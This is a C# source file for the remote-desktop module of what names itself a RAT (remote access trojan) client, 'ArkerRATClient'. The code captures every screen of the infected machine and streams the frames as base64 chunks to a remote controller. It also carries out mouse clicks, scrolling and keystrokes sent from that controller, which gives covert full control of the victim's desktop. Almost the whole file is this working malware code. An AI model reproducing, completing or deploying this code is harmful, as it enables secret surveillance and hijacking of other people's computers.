
using ArkerRATClient;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using MouseKeyboardActivityMonitor;
using MouseKeyboardActivityMonitor.WinApi;
using MouseKeyboardActivityMonitor.Controls;
using System.Linq;
using System.Text;
using System.Data.SqlTypes;

namespace ARKERRATCLIENT2._0
{
    public static class RemoteDesktop
    {
        public static void HandleData(string subString)
        {
            if (subString.Length == 0 && !RemoteDesktop.sendingFrames)
            {
                SendScreens();
            }
            else if (subString.Contains("§screen§"))
            {
                Task.Run(() => StartScreenStreaming(50, subString.Replace("§screen§", string.Empty)));
            }
            else if (subString.Contains("§KI§"))
            {
                EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
            }
            else if (subString.Contains("close") && RemoteDesktop.sendingFrames)
            {
                sendingFrames = false;
            }
            else if (subString.Contains("§ClickPositionStart§"))
                EmulateClick(subString);
        }

        public static bool sendingFrames = false;
        private const int ChunkSize = 32768;

        public static async void SendScreens()
        {
            StringBuilder stringBuilder= new StringBuilder();
            foreach (var screen in Screen.AllScreens)
            {
                stringBuilder.AppendLine(screen.DeviceName+"|");
            }
            await RATClientSession.SendData("§RemoteDesktopStart§§screen§" + stringBuilder.ToString() + "§RemoteDesktopEnd§");
        }



        static Screen CurrentScreen;
        public static async Task StartScreenStreaming(int quality, string screen)
        {

            if (VideoStreamThread != null)
            {
                sendingFrames = false;
                Task.WaitAny(VideoStreamThread);
            }

            sendingFrames = true;
            foreach (var screens in Screen.AllScreens)
            {
                if (screens.DeviceName == screen)
                {
                    CurrentScreen= screens;
                    VideoStreamThread = Task.Run(() => VideoStream(quality, CurrentScreen));
                    return;
                }
            }

            //No screen found
            sendingFrames= false;
            Task.WaitAny(VideoStreamThread);
            await RATClientSession.SendData("§RemoteDesktopStart§§screen§" + "none" + "§RemoteDesktopEnd§");
        }

        private static Task VideoStreamThread;
        

        
        private static async void VideoStream(int quality, Screen screen)
        {
            while (sendingFrames && !RATClientSession.noConnection)
            {
                Bitmap screenshot = CaptureScreenshot(screen,quality);
                List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
                await SendChunks(chunks);
                //await Task.Delay(1);
            }
        }

        private static Bitmap CaptureScreenshot(Screen screen, int quality)
        {
            int desiredWidth = screen.Bounds.Width;
            int desiredHeight = screen.Bounds.Height;

            Bitmap screenshot = new Bitmap(desiredWidth, desiredHeight);

            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            }

            return screenshot;
        }

        private static List<string> ConvertToBase64Chunks(Bitmap image, int quality)
        {
            List<string> chunks = new List<string>();
            using (MemoryStream memoryStream = new MemoryStream())
            {
                EncoderParameters encoderParameters = new EncoderParameters(1);
                encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                ImageCodecInfo jpegCodec = GetEncoderInfo(ImageFormat.Jpeg);

                image.Save(memoryStream, jpegCodec, encoderParameters);

                byte[] imageBytes = memoryStream.ToArray();
                for (int i = 0; i < imageBytes.Length; i += ChunkSize)
                {
                    int remainingBytes = Math.Min(ChunkSize, imageBytes.Length - i);
                    byte[] chunk = new byte[remainingBytes];
                    Array.Copy(imageBytes, i, chunk, 0, remainingBytes);

                    string base64Chunk = Convert.ToBase64String(chunk);
                    chunks.Add(base64Chunk);
                }
            }

            return chunks;
        }

        private static async Task SendChunks(List<string> chunks)
        {
            foreach (string chunk in chunks)
            {
                await RATClientSession.SendData("§RemoteDesktopStart§" + chunk + "§RemoteDesktopEnd§");
            }
            await RATClientSession.SendData("§RemoteDesktopStart§§RemoteDesktopFrameDone§§RemoteDesktopEnd§");
        }

        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        //CHAT GPT EMULATE CLICK
        public static void EmulateClick(string clickData)
        {
            int delta;

            //Should sort out the delimiter properly sometime idk when dont use replace :(

            string[] cordinates = clickData.Replace("§ClickPositionStart§", string.Empty).Replace("§ClickPositionEnd§", string.Empty).Split(',');
            int x = int.Parse(cordinates[0].Split('.')[0]);
            int y = int.Parse(cordinates[1].Split('.')[0]);

            Cursor.Position = new Point(CurrentScreen.Bounds.Left+ x, CurrentScreen.Bounds.Top + y);

            if (cordinates[2] == "Left")
            {
                MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.LeftDown | MouseHelper.MouseEventFlags.LeftUp);
            }
            else if (cordinates[2] == "Right")
            {
                MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.RightDown | MouseHelper.MouseEventFlags.RightUp);
            }
            else if (int.TryParse(cordinates[2], out delta))
            {
                // Scrolling up
                if (delta > 0)
                {
                    for (int i = 0; i < delta; i++)
                    {
                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, 1);
                    }
                }
                // Scrolling down
                else if (delta < 0)
                {
                    for (int i = 0; i > delta; i--)
                    {
                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, -1);
                    }
                }
            }
            else
            {
                return;
            }

            // Emulate the mouse click
        }

        public static class MouseHelper
        {
            [DllImport("user32.dll")]
            public static extern void mouse_event(MouseEventFlags flags, int dx, int dy, int data, UIntPtr extraInfo);

            [Flags]
            public enum MouseEventFlags : uint
            {
                LeftDown = 0x00000002,
                LeftUp = 0x00000004,
                MiddleDown = 0x00000020,
                MiddleUp = 0x00000040,
                RightDown = 0x00000008,
                RightUp = 0x00000010,
                Wheel = 0x00000800,
                XDown = 0x00000080,
                XUp = 0x00000100,
                Move = 0x00000001,
                Absolute = 0x00008000,
                HWheel = 0x00001000
            }

            public static void MouseEvent(MouseEventFlags flags, int data = 0)
            {
                mouse_event(flags, 0, 0, data, UIntPtr.Zero);
            }
        }

        public static void EmulateKeyStrokes(string keystroke)
        {
            //ADD MORE KEYSTROKE SOMETIME

            if (keystroke == "tab")
            {
                SendKeys.SendWait("{TAB}");
            }
            else if (keystroke == "oemperiod")
            {
                SendKeys.SendWait(".");
            }
            else if (keystroke == "leftshift")
            {
                SendKeys.SendWait("+");
            }
            else if (keystroke == "back")
            {
                SendKeys.SendWait("{BACKSPACE}");
            }
            else if (keystroke == "space")
            {
                SendKeys.SendWait(" ");
            }
            else if (keystroke == "return")
            {
                SendKeys.SendWait("{ENTER}");
            }
            else if (keystroke == "leftctrl")
            {
                SendKeys.SendWait("{CTRL}");
            }
            else if (keystroke == "system")
            {
                SendKeys.SendWait("{ALT}");
            }
            else
            {
                SendKeys.SendWait(keystroke);
            }
        }
    }
}
